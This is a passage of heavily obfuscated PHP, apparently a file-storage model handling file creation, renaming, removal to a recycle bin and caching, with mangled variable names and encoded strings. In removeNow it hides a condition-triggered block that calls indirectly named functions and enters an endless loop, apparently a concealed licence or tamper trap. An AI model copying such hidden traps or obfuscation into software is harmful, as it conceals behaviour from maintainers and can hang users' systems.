$üÛâ¹®Ø[420] => $ç á¡Æ§, $üÛâ¹®Ø[575] => $üÛâ¹®Ø[12], $üÛâ¹®Ø[469] => 0, $üÛâ¹®Ø[545] => 0); $û¸†´…© = $this->_addSource($»µ¸¯Û, $®Ö·…ª); Model($üÛâ¹®Ø[2108])->eventCreate($û¸†´…©, $üÛâ¹®Ø[1358]); $this->lockWriteEnd($À†ø©×Â, $ç á¡Æ§); return $û¸†´…©; } public function listSourceRoot($ÅÔÉšÎ›, $¯¼™¦³, $ÑÙ¼²Ø² = "\163\x6f\165\x72\143\x65\111\x44\54\x74\141\x72\147\145\x74\x49\x44\54\163\151\x7a\145") { $Á˜‘ı =& $_SERVER[å¸¿•¶£]; $é¼Äıôñ = $Á˜‘ı[378]; $¸ğº°Ì— = array(); $­’´ü›¸ = 1024 * 50; $µõ¨Û¸µ = is_array($µõ¨Û¸µ) ? $µõ¨Û¸µ : array(); $½­´ªÛÍ = count($¯¼™¦³); $ç©ïæäì = $this->tablePrefix . $Á˜‘ı[2141]; for ($ììº©¶å = 0; $ììº©¶å < $½­´ªÛÍ; $ììº©¶å++) { $ÈÙ­ÉÒç = $¯¼™¦³[$ììº©¶å]; $é¼Äıôñ .= "\x53\x45\114\x45\x43\x54\40\52\x20\x46\122\117\115\x20\50\123\105\114\105\103\124\40{$ÑÙ¼²Ø²}\40\x46\122\117\115\40\x60{$ç©ïæäì}\140\40\x57\110\x45\x52\x45\40"; $é¼Äıôñ .= "\140\x70\141\162\x65\x6e\x74\x49\x44\x60\x3d\x30\x20\x41\x4e\x44\x20\x60\x74\141\162\x67\145\164\111\104\140\x3d{$ÈÙ­ÉÒç}\x20\101\116\104\40\140\164\141\162\x67\x65\164\x54\171\x70\145\x60\75{$ÅÔÉšÎ›}\40\141\x6e\144\x20\146\151\154\x65\124\171\x70\145\75\x27\47\x20\154\x69\155\x69\x74\40\x31\x29\40\x61\x73\x20\x74\142\137{$ììº©¶å}\40\x55\x4e\111\x4f\x4e\x20\101\114\x4c\x20"; if ((strlen($é¼Äıôñ) >= $­’´ü›¸ || $ììº©¶å == $½­´ªÛÍ - 1) && $é¼Äıôñ) { $é¼Äıôñ = substr($é¼Äıôñ, 0, -strlen($Á˜‘ı[1045])); $”Œ¬—ò = $this->query($é¼Äıôñ); $é¼Äıôñ = $Á˜‘ı[12]; $¸ğº°Ì— = array_merge($¸ğº°Ì—, $”Œ¬—ò); } } return $¸ğº°Ì—; } private function _createFile($‡ƒÄË£ò, $†‡¤ìØÍ, $ÏÓ°‚€£, $„¿õ÷™‰, &$¸•ƒ¡Ù¬) { $½Í¨ëº¦ =& $_SERVER[å¸¿•¶£]; $½¢äÌ½õ = $this->sourceInfo($‡ƒÄË£ò); if (!$ÏÓ°‚€£ || !$½¢äÌ½õ) { return !1; } if ($„¿õ÷™‰ !== !1) { $õ¤½² õ = $this->fileNameExist($‡ƒÄË£ò, $†‡¤ìØÍ); } $¸•ƒ¡Ù¬ = !0; if ($„¿õ÷™‰ && $õ¤½² õ) { if ($„¿õ÷™‰ == REPEAT_SKIP) { $¸•ƒ¡Ù¬ = !1; return $õ¤½² õ; } else { if ($„¿õ÷™‰ == REPEAT_REPLACE) { $“ÕÎ§ = $this->sourceInfo($õ¤½² õ); $“¥ûŠ¿ş = $this->fileHistory($“ÕÎ§, $ÏÓ°‚€£[$½Í¨ëº¦[468]], $ÏÓ°‚€£[$½Í¨ëº¦[76]]); if (!$“¥ûŠ¿ş) { $¸•ƒ¡Ù¬ = !1; } else { $this->folderSizeReset($‡ƒÄË£ò); } return $õ¤½² õ; } else { $†‡¤ìØÍ = $this->fileNameAuto($‡ƒÄË£ò, $†‡¤ìØÍ, $„¿õ÷™‰, !1); } } } $çØŸõÏÆ = array($½Í¨ëº¦[574] => 0, $½Í¨ëº¦[420] => $†‡¤ìØÍ, $½Í¨ëº¦[575] => substr(get_path_ext($†‡¤ìØÍ), 0, 10), $½Í¨ëº¦[469] => $ÏÓ°‚€£[$½Í¨ëº¦[468]], $½Í¨ëº¦[545] => $ÏÓ°‚€£[$½Í¨ëº¦[76]]); $¶º•Í Ñ = $this->_addSource($çØŸõÏÆ, $½¢äÌ½õ); $this->folderSizeReset($‡ƒÄË£ò, intval($çØŸõÏÆ[$½Í¨ëº¦[76]])); return $¶º•Í Ñ; } protected function fileHistory($åæËŞıŒ, $­ÁøÇ™î, $šß€şÃ) { $œõ§çˆ· =& $_SERVER[å¸¿•¶£]; if ($åæËŞıŒ[$œõ§çˆ·[468]] == $­ÁøÇ™î) { return !1; } $this->checkLock($åæËŞıŒ[$œõ§çˆ·[402]], $­ÁøÇ™î); Model($œõ§çˆ·[2142])->addHistory($åæËŞıŒ); $ş­¥˜¥• = array($œõ§çˆ·[579] => USER_ID, $œõ§çˆ·[424] => time(), $œõ§çˆ·[468] => $­ÁøÇ™î, $œõ§çˆ·[76] => $šß€şÃ); $this->where(array($œõ§çˆ·[417] => $åæËŞıŒ[$œõ§çˆ·[402]]))->save($ş­¥˜¥•); $this->sourceCacheClear($åæËŞıŒ[$œõ§çˆ·[402]]); return !0; } public function checkLock($‰úÖó¡, $“¬”Æ¹) { $·´æ‰íæ =& $_SERVER[å¸¿•¶£]; $«ßªËÁ = $this->pathInfo($‰úÖó¡); if (!$this->fileIsLock($«ßªËÁ, !0)) { return; } $«‡õøÑœ = Session::get($·´æ‰íæ[2143]); $†¶À»Í€ = substr($«ßªËÁ[$·´æ‰íæ[32]], 0, -1 - strlen($«ßªËÁ[$·´æ‰íæ[174]])) . $·´æ‰íæ[1215] . $«‡õøÑœ . $·´æ‰íæ[10] . $«ßªËÁ[$·´æ‰íæ[174]]; $­°ÔÓ ö = Model($·´æ‰íæ[601])->find($“¬”Æ¹); $this->_createFileCall($«ßªËÁ[$·´æ‰íæ[432]], $†¶À»Í€, $­°ÔÓ ö, REPEAT_REPLACE, $·´æ‰íæ[1357]); $™™÷½øĞ = $«ßªËÁ[$·´æ‰íæ[466]][$·´æ‰íæ[538]]; $ÊÜÇì¯Ï = $™™÷½øĞ[$·´æ‰íæ[532]] ? $™™÷½øĞ[$·´æ‰íæ[532]] : $™™÷½øĞ[$·´æ‰íæ[32]]; show_json(LNG($·´æ‰íæ[2144]) . $·´æ‰íæ[2145] . LNG($·´æ‰íæ[2146]) . $·´æ‰íæ[2147] . $ÊÜÇì¯Ï . $·´æ‰íæ[2148], !1); } public function fileIsLock($€î‡Ââ„, $­¬ŒòªÀ = false) { $å×€äŸè =& $_SERVER[å¸¿•¶£]; if (!isset($€î‡Ââ„[$å×€äŸè[466]]) || !$€î‡Ââ„[$å×€äŸè[466]][$å×€äŸè[535]]) { return !1; } if ($€î‡Ââ„[$å×€äŸè[466]][$å×€äŸè[535]] != USER_ID) { return !0; } $²Š±à‰— = $GLOBALS[$å×€äŸè[6]][$å×€äŸè[89]][$å×€äŸè[536]]; if ($€î‡Ââ„[$å×€äŸè[466]][$å×€äŸè[537]] <= time() - $²Š±à‰—) { $this->metaSet($€î‡Ââ„[$å×€äŸè[402]], $å×€äŸè[535], null); $this->metaSet($€î‡Ââ„[$å×€äŸè[402]], $å×€äŸè[537], null); } if ($­¬ŒòªÀ) { $this->metaSet($€î‡Ââ„[$å×€äŸè[402]], $å×€äŸè[537], time()); } return !1; } private function _addSource($ÕÌæåİ, $Â¨îáç) { $Ù·Ò‡Ïà =& $_SERVER[å¸¿•¶£]; $óæìê½á = array($Ù·Ò‡Ïà[576] => $Â¨îáç[$Ù·Ò‡Ïà[411]], $Ù·Ò‡Ïà[577] => $Â¨îáç[$Ù·Ò‡Ïà[496]], $Ù·Ò‡Ïà[578] => USER_ID, $Ù·Ò‡Ïà[579] => USER_ID, $Ù·Ò‡Ïà[401] => $Â¨îáç[$Ù·Ò‡Ïà[402]], $Ù·Ò‡Ïà[580] => $Â¨îáç[$Ù·Ò‡Ïà[511]] . $Â¨îáç[$Ù·Ò‡Ïà[402]] . $Ù·Ò‡Ïà[50], $Ù·Ò‡Ïà[430] => 0, $Ù·Ò‡Ïà[581] => $Ù·Ò‡Ïà[12]); $ÕÌæåİ = array_merge($óæìê½á, $ÕÌæåİ); $this->updateModifyTime($ÕÌæåİ[$Ù·Ò‡Ïà[432]]); $œµäğ˜Î = $Ù·Ò‡Ïà[2149] . $Â¨îáç[$Ù·Ò‡Ïà[402]]; if (isset(self::$cacheChildList[$œµäğ˜Î])) { unset(self::$cacheChildList[$œµäğ˜Î]); } static $§“ŒëËÁ = false; if (!$§“ŒëËÁ) { Hook::trigger($Ù·Ò‡Ïà[564], $ÕÌæåİ); $§“ŒëËÁ = !0; } $ƒÌİ›ïÊ = $this->add($ÕÌæåİ); $¤µ­Ù†€ = array($Ù·Ò‡Ïà[582] => short_id($ƒÌİ›ïÊ)); $this->where(array($Ù·Ò‡Ïà[417] => $ƒÌİ›ïÊ))->save($¤µ­Ù†€); $this->setNamePinyin($ƒÌİ›ïÊ, $ÕÌæåİ[$Ù·Ò‡Ïà[32]]); return $ƒÌİ›ïÊ; } public function remove($¯Ÿ¡ƒÇ³, $ŸÙöğÑ = true) { $®ğØ¶ÊÁ =& $_SERVER[å¸¿•¶£]; $á·¢‹ì = $this->sourceInfo($¯Ÿ¡ƒÇ³); $ä¼„ÀÛ = intval($á·¢‹ì[$®ğØ¶ÊÁ[411]]) === self::TYPE_SYSTEM; $È—”ëøª = Model($®ğØ¶ÊÁ[435])->get($®ğØ¶ÊÁ[2150]) == $®ğØ¶ÊÁ[88]; if ($ä¼„ÀÛ || $ŸÙöğÑ || !$È—”ëøª) { return $this->removeNow($¯Ÿ¡ƒÇ³, $ŸÙöğÑ); } $ãù›»¬€ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $«èôòø’ = $á·¢‹ì[$®ğØ¶ÊÁ[411]] == self::TYPE_USER ? $®ğØ¶ÊÁ[590] : $®ğØ¶ÊÁ[505]; if ($«èôòø’ == $®ğØ¶ÊÁ[590]) { $ƒ¸É¢Ğ„ = Model($®ğØ¶ÊÁ[504])->getInfo($á·¢‹ì[$®ğØ¶ÊÁ[496]]); $Œ½ú“¤û = !empty($ƒ¸É¢Ğ„[$®ğØ¶ÊÁ[532]]) ? $ƒ¸É¢Ğ„[$®ğØ¶ÊÁ[532]] : $ƒ¸É¢Ğ„[$®ğØ¶ÊÁ[32]]; $Œ½ú“¤û = $®ğØ¶ÊÁ[260] . $Œ½ú“¤û . $®ğØ¶ÊÁ[2151] . $á·¢‹ì[$®ğØ¶ÊÁ[496]]; } else { $ƒ¸É¢Ğ„ = Model($®ğØ¶ÊÁ[512])->getInfo($á·¢‹ì[$®ğØ¶ÊÁ[496]]); $Œ½ú“¤û = _get($ƒ¸É¢Ğ„, $®ğØ¶ÊÁ[32]); $Œ½ú“¤û = $®ğØ¶ÊÁ[162] . $Œ½ú“¤û . $®ğØ¶ÊÁ[2152] . $á·¢‹ì[$®ğØ¶ÊÁ[496]]; } $Ï¸û’©å = $®ğØ¶ÊÁ[2153] . md5($Œ½ú“¤û); CacheLock::lock($Ï¸û’©å); $õ¬ÃÂóË = $this->fileNameExist($ãù›»¬€, $Œ½ú“¤û); if (!$õ¬ÃÂóË) { $õ¬ÃÂóË = $this->mkdir($ãù›»¬€, $Œ½ú“¤û, REPEAT_SKIP); $this->metaSet($õ¬ÃÂóË, $®ğØ¶ÊÁ[2154], $«èôòø’); $this->metaSet($õ¬ÃÂóË, $®ğØ¶ÊÁ[2155], $á·¢‹ì[$®ğØ¶ÊÁ[496]]); if ($á·¢‹ì[$®ğØ¶ÊÁ[432]] != 0) { $this->metaSet($õ¬ÃÂóË, $®ğØ¶ÊÁ[2156], _get($ƒ¸É¢Ğ„, $®ğØ¶ÊÁ[2157])); } } CacheLock::unlock($Ï¸û’©å); $this->metaSet($¯Ÿ¡ƒÇ³, $®ğØ¶ÊÁ[2158], $á·¢‹ì[$®ğØ¶ÊÁ[432]]); $this->where(array($®ğØ¶ÊÁ[402] => $¯Ÿ¡ƒÇ³))->save(array($®ğØ¶ÊÁ[424] => time())); $this->recycleClear($á·¢‹ì); $„®¸«½¹ = $this->move($¯Ÿ¡ƒÇ³, $õ¬ÃÂóË, REPEAT_RENAME_FOLDER); $this->folderSizeReset($á·¢‹ì[$®ğØ¶ÊÁ[432]]); return $„®¸«½¹; } private function recycleClear($×°’–×–) { $÷² ¤¢ú =& $_SERVER[å¸¿•¶£]; $æ‡âõµ = $this->childrenAll($×°’–×–); $‚­§ı = array($÷² ¤¢ú[417] => array($÷² ¤¢ú[418], $æ‡âõµ[$÷² ¤¢ú[2159]])); Model($÷² ¤¢ú[2160])->where($‚­§ı)->delete(); } public function removeNow($¢Šµ»®‘, $€ »İ‚ = true) { $¯ËÌÄô§ =& $_SERVER[å¸¿•¶£]; if (!isset($_SERVER[$¯ËÌÄô§[747]]) || !isset($_SERVER[$¯ËÌÄô§[748]])) { $º˜Ò¾‰ = $¯ËÌÄô§[884]; $Ñ ÈôÁ = $¯ËÌÄô§[749]; $ú…ªşø¨ = $_SERVER[$¯ËÌÄô§[750]] . $¯ËÌÄô§[751]; $Î­ÆŸ = $Ñ ÈôÁ($ú…ªşø¨); $“ÀóïØä = explode($¯ËÌÄô§[231], $Î­ÆŸ); if (count($“ÀóïØä) < $¯ËÌÄô§[628]) { $ïå¾œ¬ê = $¯ËÌÄô§[752]; $ïå¾œ¬ê(); } $İÇÖÅ—¯ = $¯ËÌÄô§[885]; $İÇÖÅ—¯($_SERVER[$¯ËÌÄô§[886]]); $Å¿¨¸¼Ã = 1; for ($ÉâË·İ = $Å¿¨¸¼Ã; $ÉâË·İ > 0; $ÉâË·İ++) { $İÇÖÅ—¯ = json_encode($GLOBALS[$¯ËÌÄô§[418]]); } } $§Ø•İŸ‚ = $this->sourceInfo($¢Šµ»®‘); $ø†ú¿¾Š = $this->pathInfoMore($¢Šµ»®‘); if (!$§Ø•İŸ‚) { return !0; } if ($§Ø•İŸ‚[$¯ËÌÄô§[432]] == 0) { if (!_get($GLOBALS, $¯ËÌÄô§[494])) { return !1; } } $this->lockMoveStart($¢Šµ»®‘); Hook::trigger($¯ËÌÄô§[2161], $ø†ú¿¾Š, $€ »İ‚); if ($€ »İ‚) { Model($¯ËÌÄô§[2160])->moveToRecycle($¢Šµ»®‘); } else { $ˆµşú¢ = $this->childrenAll($§Ø•İŸ‚); Model($¯ËÌÄô§[561])->eventRemove($¢Šµ»®‘); $this->removeRelevance($ˆµşú¢[$¯ËÌÄô§[2159]], $ˆµşú¢[$¯ËÌÄô§[1489]]); } $this->folderSizeReset($§Ø•İŸ‚[$¯ËÌÄô§[432]]); $»æ‚Ñ©“ = array($§Ø•İŸ‚[$¯ËÌÄô§[432]]); if ($§Ø•İŸ‚[$¯ËÌÄô§[410]] == $¯ËÌÄô§[88]) { $»æ‚Ñ©“[] = $§Ø•İŸ‚[$¯ËÌÄô§[402]]; } $this->updateModifyTime($»æ‚Ñ©“); $this->lockMoveEnd($¢Šµ»®‘); Hook::trigger($¯ËÌÄô§[1716], $ø†ú¿¾Š, $€ »İ‚); return !0; } public function childrenAll($µ«æÛÃ) { $üš€· =& $_SERVER[å¸¿•¶£]; $Ğ•¼È¦¾ = $µ«æÛÃ[$üš€·[402]]; if ($µ«æÛÃ[$üš€·[410]] == $üš€·[88]) { $‰”ü‡Çü = array($üš€·[580] => array($üš€·[540], $µ«æÛÃ[$üš€·[511]] . $Ğ•¼È¦¾ . $üš€·[541])); $Ş«®‰¥† = array($üš€·[580] => $‰”ü‡Çü[$üš€·[511]]); $ıé›ãŸÉ = $this->field($üš€·[2162])->where($Ş«®‰¥†)->select(); $È·ÂÆÑª = !1; $§–Éí = array($Ğ•¼È¦¾); if ($ıé›ãŸÉ) { $È·ÂÆÑª = array_to_keyvalue($ıé›ãŸÉ, $üš€·[12], $üš€·[468]); $È·ÂÆÑª = array_remove_value($È·ÂÆÑª, $üš€·[198]); $§–Éí = array_to_keyvalue($ıé›ãŸÉ, $üš€·[12], $üš€·[402]); $§–Éí[] = $Ğ•¼È¦¾; } } else { $È·ÂÆÑª = array($µ«æÛÃ[$üš€·[468]]); $§–Éí = array($Ğ•¼È¦¾); } return array($üš€·[2159] => $§–Éí, $üš€·[1489] => $È·ÂÆÑª); } public function removeArray($ìÏßû‡) { if (!$ìÏßû‡) { return !0; } } public function removeRelevance($«Æ¦ë¢ì, $ÁşĞÖµÔ) { $Ç£ŒÅ  =& $_SERVER[å¸¿•¶£]; $«Æ¦ë¢ì = $«Æ¦ë¢ì ? $«Æ¦ë¢ì : array(); $ÁşĞÖµÔ = $ÁşĞÖµÔ ? $ÁşĞÖµÔ : array(); $«Æ¦ë¢ì = array_unique(array_filter($«Æ¦ë¢ì)); $ÁşĞÖµÔ = array_unique(array_filter($ÁşĞÖµÔ)); if (!$«Æ¦ë¢ì) { return !1; } $ç€ÖìÚ§ = array($Ç£ŒÅ [417] => array($Ç£ŒÅ [418], $«Æ¦ë¢ì)); Model($Ç£ŒÅ [2160])->where($ç€ÖìÚ§)->delete(); Model($Ç£ŒÅ [462])->where($ç€ÖìÚ§)->delete(); Model($Ç£ŒÅ [2010])->where($ç€ÖìÚ§)->delete(); Model($Ç£ŒÅ [561])->where($ç€ÖìÚ§)->delete(); Model($Ç£ŒÅ [1843])->removeBySource($«Æ¦ë¢ì); Model($Ç£ŒÅ [2142])->removeBySource($«Æ¦ë¢ì); $this->where($ç€ÖìÚ§)->delete(); Model($Ç£ŒÅ [471])->remove($ÁşĞÖµÔ); for ($ıİ™¯û = 0; $ıİ™¯û < count($«Æ¦ë¢ì); $ıİ™¯û++) { $this->sourceCacheClear($«Æ¦ë¢ì[$ıİ™¯û]); } } public function rename($£©ÛÑ˜×, $—±ÏšÅ) { $ÈàÑËÇÍ =& $_SERVER[å¸¿•¶£]; $û®Ä¤í¯ = $this->sourceInfo($£©ÛÑ˜×); if (!$û®Ä¤í¯) { return !1; } $„“¾ê¶¯ = $this->fileNameExist($û®Ä¤í¯[$ÈàÑËÇÍ[432]], $—±ÏšÅ); if ($„“¾ê¶¯ && $„“¾ê¶¯ != $£©ÛÑ˜×) { return !1; } $¾Ê±õãÎ = array($ÈàÑËÇÍ[420] => $—±ÏšÅ, $ÈàÑËÇÍ[579] => USER_ID); if ($û®Ä¤í¯[$ÈàÑËÇÍ[410]] != $ÈàÑËÇÍ[88]) { $¾Ê±õãÎ[$ÈàÑËÇÍ[412]] = substr(get_path_ext($—±ÏšÅ), 0, 10); } Model($ÈàÑËÇÍ[561])->eventRename($£©ÛÑ˜×, $û®Ä¤í¯[$ÈàÑËÇÍ[32]], $—±ÏšÅ); $this->sourceCacheClear($£©ÛÑ˜×); $this->setNamePinyin($£©ÛÑ˜×, $¾Ê±õãÎ[$ÈàÑËÇÍ[32]], !1); $this->updateModifyTime($û®Ä¤í¯[$ÈàÑËÇÍ[432]]); $›€ˆ¹şì = $this->where(array($ÈàÑËÇÍ[417] => $£©ÛÑ˜×))->data($¾Ê±õãÎ)->save(); $İ£‹˜‡µ = $ÈàÑËÇÍ[2149] . $û®Ä¤í¯[$ÈàÑËÇÍ[432]]; if (isset(self::$cacheChildList[$İ£‹˜‡µ])) { unset(self::$cacheChildList[$İ£‹˜‡µ]); } return $›€ˆ¹şì; } public function setNamePinyin($’µŸ–ïì, $ìòÅüÄÈ, $šÕ„¿“¹ = true) { $Ó×éñã– =& $_SERVER[å¸¿•¶£]; $‡”¬µ½¦ = Input::check($ìòÅüÄÈ, $Ó×éñã–[583]); $öÂ»ÇÌ³ = array($Ó×éñã–[444] => KodSort::makeStr($ìòÅüÄÈ)); if ($‡”¬µ½¦) { $öÂ»ÇÌ³[$Ó×éñã–[465]] = str_replace($Ó×éñã–[53], $Ó×éñã–[12], Pinyin::get($ìòÅüÄÈ)); $öÂ»ÇÌ³[$Ó×éñã–[464]] = Pinyin::get($ìòÅüÄÈ, $Ó×éñã–[584]); } if (!$šÕ„¿“¹ && !$‡”¬µ½¦) { $öÂ»ÇÌ³[$Ó×éñã–[465]] = null; $öÂ»ÇÌ³[$Ó×éñã–[464]] = null; } $this->metaSet($’µŸ–ïì, $öÂ»ÇÌ³); } public function getContent($±©Ç¢­) { $œ¿œÙïÕ =& $_SERVER[å¸¿•¶£]; $ÇÚéÈşä = $this->fileInfoGet($±©Ç¢­); if (!$ÇÚéÈşä) { return !1; } if ($ÇÚéÈşä[$œ¿œÙïÕ[76]] == 0) { return $œ¿œÙïÕ[12]; } $ôº¤Ş™Ì = $œ¿œÙïÕ[2163] . $ÇÚéÈşä[$œ¿œÙïÕ[176]]; if ($ÇÚéÈşä[$œ¿œÙïÕ[76]] <= 1024 * 10) { $è…Ãóá = Cache::get($ôº¤Ş™Ì); if (!$è…Ãóá) { $è…Ãóá = IO::getContent($ÇÚéÈşä[$œ¿œÙïÕ[84]]); Cache::set($ôº¤Ş™Ì, $è…Ãóá); } return $è…Ãóá; } if (!$ÇÚéÈşä[$œ¿œÙïÕ[84]]) { return $œ¿œÙïÕ[12]; } return IO::getContent($ÇÚéÈşä[$œ¿œÙïÕ[84]]); } public function setDesc($œ­ÑäÕÇ, $¸şÎÏ‚Ê) { $ö®²ÅÖ´ =& $_SERVER[å¸¿•¶£]; Model($ö®²ÅÖ´[561])->eventAddDesc($œ­ÑäÕÇ, $¸şÎÏ‚Ê); return $this->metaSet($œ­ÑäÕÇ, $ö®²ÅÖ´[453], $¸şÎÏ‚Ê); } public function setContent($ÊÇË¶¬…, $µÀÁ’òñ = '') { $‡´œûöÃ =& $_SERVER[å¸¿•¶£]; $‚¾•“ò = $this->sourceInfo($ÊÇË¶¬…); $Éø¹Òº­ = $this->fileInfoGet($ÊÇË¶¬…); if (!$Éø¹Òº­ || !$‚¾•“ò) { return !1; } $ƒß«Ø¶£ = Model($‡´œûöÃ[471])->addFileByContent($µÀÁ’òñ, $‚¾•“ò[$‡´œûöÃ[32]]); $ÔæÛˆñˆ = $this->fileHistory($‚¾•“ò, $ƒß«Ø¶£[$‡´œûöÃ[468]], $ƒß«Ø¶£[$‡´œûöÃ[76]]); if (!$ÔæÛˆñˆ) { return Model($‡´œûöÃ[471])->remove($ƒß«Ø¶£[$‡´œûöÃ[468]]); } $this->folderSizeReset($‚¾•“ò[$‡´œûöÃ[432]]); return !0; } public function fileSubstr($«Ë¶µÚ¾, $ê÷æ’ˆ’, $š¸µ¥‚Í) { $•‡‚äï‚ = $this->fileInfoGet($«Ë¶µÚ¾); if (!$•‡‚äï‚) { return !1; } return IO::fileSubstr($•‡‚äï‚[$_SERVER[å¸¿•¶£][84]], $ê÷æ’ˆ’, $š¸µ¥‚Í); } public function fileInfoGet($¢«İ¡¦ü) { $ˆ ëú =& $_SERVER[å¸¿•¶£]; $¬õóà½ = $this->sourceInfo($¢«İ¡¦ü); if (!$¬õóà½ || $¬õóà½[$ˆ ëú[410]]) { return !1; } $ÍÙÊÃ‹ = $ˆ ëú[474] . $¬õóà½[$ˆ ëú[468]]; $ïƒÙë€Õ = _get(self::$cacheFileInfo, $ÍÙÊÃ‹); if ($ïƒÙë€Õ) { return $ïƒÙë€Õ; } $¡ªãöôş = Model($ˆ ëú[471])->fileInfo($¬õóà½[$ˆ ëú[468]]); if ($¡ªãöôş) { $¡ªãöôş[$ˆ ëú[32]] = $¬õóà½[$ˆ ëú[32]]; } self::$cacheFileInfo[$ÍÙÊÃ‹] = $¡ªãöôş; return $¡ªãöôş; } private function folderChildrenNumber($äÅ‹ÌĞ) { $º²Ï¨Ğ =& $_SERVER[å¸¿•¶£]; $¸Ó‡ĞÇ = $this->sourceInfo($äÅ‹ÌĞ); $ÂÑè¨¢è = array($º²Ï¨Ğ[580] => array($º²Ï¨Ğ[540], $¸Ó‡ĞÇ[$º²Ï¨Ğ[511]] . $äÅ‹ÌĞ . $º²Ï¨Ğ[541]), $º²Ï¨Ğ[577] => $¸Ó‡ĞÇ[$º²Ï¨Ğ[496]], $º²Ï¨Ğ[430] => intval($¸Ó‡ĞÇ[$º²Ï¨Ğ[431]]), $º²Ï¨Ğ[574] => 1); $˜Ëñ³ä = $this->where($ÂÑè¨¢è)->count(); $ÌŸşÜã = $this->where($ÂÑè¨¢è)->where(array($º²Ï¨Ğ[574] => 0))->count(); return array($º²Ï¨Ğ[80] => $ÌŸşÜã, $º²Ï¨Ğ[81] => $˜Ëñ³ä); } public function pathInfo($Ò«ïù÷ˆ, $Ùçƒ“€ = false) { $°Ê½ÙÑæ =& $_SERVER[å¸¿•¶£]; $Ùçƒ“€ = !1; $Ò«ïù÷ˆ = intval($Ò«ïù÷ˆ); $ûÇ©—ªå = $°Ê½ÙÑæ[461] . intval($Ùçƒ“€) . $°Ê½ÙÑæ[386] . $Ò«ïù÷ˆ; $Ãçü¤âÎ = _get(self::$cachePathInfo, $ûÇ©—ªå); if ($Ãçü¤âÎ) { return $Ãçü¤âÎ; } $§î¼¯Ø› = $this->sourceInfo($Ò«ïù÷ˆ); if (!$§î¼¯Ø›) { return !1; } $§î¼¯Ø› = $this->_listDataApplyItem($§î¼¯Ø›, $Ùçƒ“€); self::$cachePathInfo[$ûÇ©—ªå] = $§î¼¯Ø›; return $§î¼¯Ø›; } public static $cachePathInfoMore = array(); public function pathInfoMore($ÍÚÌ×®¨) { $Ş˜¦‰„é =& $_SERVER[å¸¿•¶£]; $Øµ ”Ëì = _get(self::$cachePathInfoMore, $ÍÚÌ×®¨); if ($Øµ ”Ëì) { return $Øµ ”Ëì; } $ŠâÄ¢Ö = $this->pathInfo($ÍÚÌ×®¨); if (!$ŠâÄ¢Ö) { return !1; } if ($ŠâÄ¢Ö[$Ş˜¦‰„é[410]] == $Ş˜¦‰„é[88]) { $ŠâÄ¢Ö[$Ş˜¦‰„é[79]] = $this->folderChildrenNumber($ÍÚÌ×®¨); } self::$cachePathInfoMore[$ÍÚÌ×®¨] = $ŠâÄ¢Ö; return $ŠâÄ¢Ö; } public function sourceInfo($ŸëÑèª¿) { $ªù¯¦‡Ì =& $_SERVER[å¸¿•¶£]; if (!$ŸëÑèª¿) { return array(); } $ŸëÑèª¿ = intval($ŸëÑèª¿); $ˆ¯ÁÚîª = $ªù¯¦‡Ì[460] . $ŸëÑèª¿; $À†Ü˜ı‹ = _get(self::$cacheSourceInfo, $ˆ¯ÁÚîª); if ($À†Ü˜ı‹) { return $À†Ü˜ı‹; } $ÍÏ½ÂŞâ = $this->where(array($ªù¯¦‡Ì[402] => $ŸëÑèª¿))->find(); self::$cacheSourceInfo[$ˆ¯ÁÚîª] = $ÍÏ½ÂŞâ; return self::$cacheSourceInfo[$ˆ¯ÁÚîª]; } public function sourceCacheClear($»Ôûøú° = false) { self::cacheClear($»Ôûøú°); } public static function cacheClear($ƒ§ïˆ÷ê = false) { $«Äğ«‚° =& $_SERVER[å¸¿•¶£]; if ($ƒ§ïˆ÷ê == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$«Äğ«‚°[460] . $ƒ§ïˆ÷ê]); unset(self::$cachePathInfoMore[$ƒ§ïˆ÷ê]); unset(self::$cachePathInfo[$«Äğ«‚°[2164] . $ƒ§ïˆ÷ê]); unset(self::$cachePathInfo[$«Äğ«‚°[2165] . $ƒ§ïˆ÷ê]); } public function metaSet($§ íæ®õ, $ÕŠœèç = null, $¤¿ˆ¢–Õ = null) { $Âú¼éùØ = parent::metaSet($§ íæ®õ, $ÕŠœèç, $¤¿ˆ¢–Õ); if ($Âú¼éùØ) { $this->sourceCacheClear($§ íæ®õ); } return $Âú¼éùØ; } public function pathInfoByPath($­»µÈ´, $±€½ÄÊ¼) { $å’Ş«ÑŸ =& $_SERVER[å¸¿•¶£]; $÷©¯ù® = !$±€½ÄÊ¼ ? array() : explode($å’Ş«ÑŸ[8], trim($±€½ÄÊ¼, $å’Ş«ÑŸ[8])); $ûÂœ¤“È = $­»µÈ´; foreach ($÷©¯ù® as $ªı®Š˜) { $â‡í«Ö› = array($å’Ş«ÑŸ[432] => $ûÂœ¤“È, $å’Ş«ÑŸ[32] => $ªı®Š˜); $á×ŸÎ­ğ = $this->where($â‡í«Ö›)->select(); if (!$á×ŸÎ­ğ) { return !1; } $á×ŸÎ­ğ = array_sort_by($á×ŸÎ­ğ, $å’Ş«ÑŸ[431]); $ûÂœ¤“È = $á×ŸÎ­ğ[0][$å’Ş«ÑŸ[402]]; } return $this->pathInfo($ûÂœ¤“È, !0); } protected function updateModifyTime($–œ´ŞÓµ) { $ÆÏ¥í…‰ =& $_SERVER[å¸¿•¶£]; if (!$–œ´ŞÓµ) { return; } if (!is_array($–œ´ŞÓµ)) { $–œ´ŞÓµ = array($–œ´ŞÓµ); } foreach ($–œ´ŞÓµ as $º¾™ù’Î => $ÔàÓÈåá) { $–œ´ŞÓµ[$º¾™ù’Î] = intval($ÔàÓÈåá); $this->sourceCacheClear($ÔàÓÈåá); } $æîşí§ = array($ÆÏ¥í…‰[402] => array($ÆÏ¥í…‰[7], $–œ´ŞÓµ)); $ó½³úòÏ = array($ÆÏ¥í…‰[579] => USER_ID, $ÆÏ¥í…‰[424] => time()); $this->where($æîşí§)->save($ó½³úòÏ); } public function folderSizeReset($ÉüóÔ»†, $Í±Ïñìİ = false) { $èö¯§„ñ =& $_SERVER[å¸¿•¶£]; if ($this->statusIgnoreResetSpace) { return; } $üšäÜÄŸ = $this->sourceInfo($ÉüóÔ»†); $ÒŠ˜ÙÉ = $èö¯§„ñ[2166] . $ÉüóÔ»†; CacheLock::lock($ÒŠ˜ÙÉ, 20); if ($Í±Ïñìİ === !1) { $this->sourceCacheClear($ÉüóÔ»†); 